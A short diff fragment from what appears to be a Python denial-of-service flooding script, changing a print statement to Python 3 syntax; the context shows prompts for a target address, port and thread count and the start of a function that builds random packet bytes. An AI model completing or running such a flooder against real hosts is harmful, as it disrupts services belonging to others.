@@ -18,7 +18,7 @@ time.sleep(0.5)
 ip = str(input("Url/ip:"))
 port = int(input("Port:"))
 thread_num = int(input("Threads:"))
-print "Attacking !!! Thread:",thread_num
+print ("Attacking !!! Thread:",thread_num)
 
 def run():
 	bytes = random._urandom(1024)
